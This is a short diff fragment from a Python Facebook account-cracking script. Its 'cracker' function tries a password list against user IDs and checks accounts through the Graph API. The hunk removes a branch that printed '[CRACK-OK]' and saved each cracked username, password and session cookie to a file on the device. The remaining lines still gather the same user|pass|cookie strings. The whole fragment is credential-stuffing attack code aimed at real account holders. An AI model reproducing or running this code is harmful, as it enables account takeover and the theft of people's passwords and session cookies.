@@ -395,13 +395,6 @@ def cracker(ids,passlist):
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [CRACK-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/CRACK/CRACK-COOKIE-OK.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        oks.append(ids)
-                        break
-                    else:
                         bkas.append(user)
                         if len(bkas)% 2 == 0:
                            statusok = (f"{user}|{pas}|{kuki}")
